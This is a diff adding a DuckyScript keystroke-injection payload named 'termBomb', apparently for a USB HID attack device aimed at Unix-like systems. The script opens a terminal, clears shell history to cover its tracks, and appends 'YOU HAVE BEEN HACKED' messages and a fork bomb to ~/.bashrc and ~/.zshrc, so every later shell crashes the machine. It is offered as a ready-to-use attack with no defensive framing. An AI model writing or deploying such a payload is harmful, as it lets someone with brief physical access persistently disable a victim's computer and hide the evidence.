@@ -1,0 +1,43 @@
+REM Title: termBomb
+REM Description: termBomb prompts message "!!!!!!YOU HAVE BEEN HACKED!!!!!!" and executes fork bomb on launching shell/terminal.
+REM Author: drapl0n
+REM Version: 1.0
+REM Category: Execution
+REM Target: Unix-like operating systems.
+REM Attackmode: HID
+
+DELAY 400
+CTRL-ALT t
+DELAY 400
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+STRING cat <<EOF > /tmp/tmppp
+ENTER
+STRING ls -a | grep 'zshrc' &> /dev/null
+ENTER 
+STRING if [ 0 = 0 ]; then
+ENTER
+STRING         echo -e "echo -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"" >> ~/.zshrc
+ENTER
+STRING         echo ":(){ :|:& };:" >> ~/.zshrc
+ENTER
+STRING fi
+ENTER
+ENTER
+STRING ls -a | grep 'bashrc' &> /dev/null
+ENTER
+STRING if [ 0 = 0 ]; then
+ENTER
+STRING         echo -e "echo -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"" >> ~/.bashrc
+ENTER
+STRING         echo ":(){ :|:& };:" >> ~/.bashrc
+ENTER
+STRING fi
+ENTER
+STRING EOF
+ENTER
+DELAY 300
+STRING chmod +x /tmp/tmppp && /tmp/./tmppp && rm /tmp/tmppp
+ENTER
+STRING exit
+ENTER
